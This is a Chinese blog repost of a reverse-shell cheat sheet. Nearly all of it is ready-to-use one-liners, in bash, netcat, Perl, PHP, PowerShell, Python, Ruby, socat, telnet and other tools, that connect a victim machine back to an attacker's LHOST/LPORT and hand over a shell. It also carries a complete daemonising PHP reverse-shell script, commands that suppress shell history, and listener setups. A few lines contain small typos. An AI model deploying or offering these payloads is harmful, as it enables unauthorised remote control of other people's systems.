---
title: Reverse-shells
tags:
  - Shell
  - 备忘录
categories:
  - 转载搬运
copyright: true
abbrlink: 8a802f59
date: 2019-04-05 20:03:33
---
![](https://ae01.alicdn.com/kf/HTB1jk1rarys3KVjSZFnq6xFzpXaZ.jpg)
<!--more-->
常用反弹shell姿势

原文作者：[Antonios Tsolis](https://alamot.github.io/reverse_shells/)

## Awk ##

```bash
awk 'BEGIN {s = "/inet/tcp/0/LHOST/LPORT"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

## Bash ##

```bash
bash -i >& /dev/tcp/LOST/LPORT 0>&1

0<&196;exec 196<>/dev/tcp/LHOST/LPORT; sh <&196 >&196 2>&196

exec 5<>/dev/tcp/LHOST/LPORT && while read line 0<&5; do $line 2>&5 >&5; done
```

## Java ##

```bash
r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/LHOST/LPORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor()
```

##  #Netcat ##

```bash
nc -e /bin/bash LHOST LPORT

/bin/bash|nc LHOST LPORT

rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f

rm -f backpipe; mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc LHOST LPORT 1>/tmp/backpipe

rm -f backpipe; mknod /tmp/backpipe p && nc LHOST LPORT 0<backpipe | /bin/bash 1>backpipe
```

## Perl ##

```bash
perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

```bash
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"LPORT:LHOST");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

**Windows**

```bash
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"LPORT:LHOST");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

## PHP ##

```bash
php -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/bash -i <&3 >&3 2>&3");'
```

```bash
php -r '$sock=fsockopen("LHOST",LPORT);shell_exec("/bin/bash -i <&3 >&3 2>&3");'
```

```bash
php -r '$sock=fsockopen("LHOST",LPORT);`/bin/bash -i <&3 >&3 2>&3`;'
```

```bash
php -r '$sock=fsockopen("LHOST",LPORT);system("/bin/bash -i <&3 >& 2>&3");'
```

```bash
php -r '$sock=fsockopen("LHOST",LPORT);popen("/bin/bash -i <&3 >& 2>&3");'
```

php写成一行

```bash
<?php set_time_limit (0); $VERSION = "1.0"; $ip = "LHOST"; $port = LPORT; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = "uname -a; w; id; /bin/bash -i"; $daemon = 0; $debug = 0; if (function_exists("pcntl_fork")) { $pid = pcntl_fork(); if ($pid == -1) { printit("ERROR: Cannot fork"); exit(1); } if ($pid) { exit(0); } if (posix_setsid() == -1) { printit("Error: Cannot setsid()"); exit(1); } $daemon = 1; } else { printit("WARNING: Failed to daemonise.  This is quite common and not fatal."); } chdir("/"); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit("$errstr ($errno)"); exit(1); } $descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w")); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit("ERROR: Cannot spawn shell"); exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit("Successfully opened reverse shell to $ip:$port"); while (1) { if (feof($sock)) { printit("ERROR: Shell connection terminated"); break; } if (feof($pipes[1])) { printit("ERROR: Shell process terminated"); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit("SOCK READ"); $input = fread($sock, $chunk_size); if ($debug) printit("SOCK: $input"); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { if ($debug) printit("STDOUT READ"); $input = fread($pipes[1], $chunk_size); if ($debug) printit("STDOUT: $input"); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { if ($debug) printit("STDERR READ"); $input = fread($pipes[2], $chunk_size); if ($debug) printit("STDERR: $input"); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) {  if (!$daemon) { print "$string\\n"; } } ?>
```

## Powershell ##

```bash
$client = New-Object System.Net.Sockets.TCPClient('LHOST',LPORT); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close();
```

## python ##

**TCP**

```bash
python -c "import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('LHOST',LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn(['/bin/bash','-i']);s.close();exit();"
```

**STCP**

```bash
python -c "import os,pty,socket,sctp;s=sctp.sctpsocket_tcp(socket.AF_INET);s.connect(('LHOST',LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn(['/bin/bash','-i']);s.close();exit();"
```

**UDP**

```bash
python -c "import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect(('LHOST',LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn(['/bin/bash','-i']);s.close();"
```

## Ruby ##

```bash
ruby -rsocket -e 'f=TCPSocket.open("LHOST",LPORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

```bash
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("LHOST","LPORT");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

**Windows**

```bash
ruby -rsocket -e 'c=TCPSocket.new("LHOST","LPORT");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

## Socat ##

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT
```

## TCLsh ##

```bash
echo 'set s [socket LHOST LPORT];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh
```


## Telnet ##

```bash
rm -f /tmp/p; mknod /tmp/p p && telnet LHOST LPORT 0/tmp/p
```

```bash
telnet LHOST LPORT | /bin/bash | telnet LHOST LPORT
```

## xterm ##

```bash
xhost +RHOST
xterm -display LHOST:0 or DISPLAY=LHOST: xterm
```

## Listeners ##

```bash
socat file:`tty`,echo=0,raw tcp-listen:LPORT
nc -lvvp LPORT
```
